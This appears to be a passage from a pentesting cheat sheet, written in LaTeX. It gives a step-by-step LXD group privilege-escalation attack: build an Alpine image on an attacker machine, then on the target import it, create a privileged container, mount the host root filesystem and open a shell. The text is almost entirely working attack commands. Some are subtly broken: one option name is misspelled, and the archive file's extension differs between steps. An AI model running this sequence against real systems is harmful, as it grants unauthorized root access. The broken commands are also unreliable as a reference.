\subsection{lxd/lxc Group}
\subsubsection{Introduction}
If you belong to lxd or lxc group, you can become root

\subsection{Predator machine}

\begin{verbatim}
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
sudo go get -d -v github.com/lxc/distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
\end{verbatim}


\subsubsection{Prey machine}
transfer lxd.tar.gz and rootfs.squashfs on target


\begin{verbatim}
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list

lxc init alpine privesc -c security.priviled=true
lxc list
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
id
\end{verbatim}

\subsubsection{links}
\url{https://www.hackingarticles.in/lxd-privilege-escalation/}
\url{https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation}
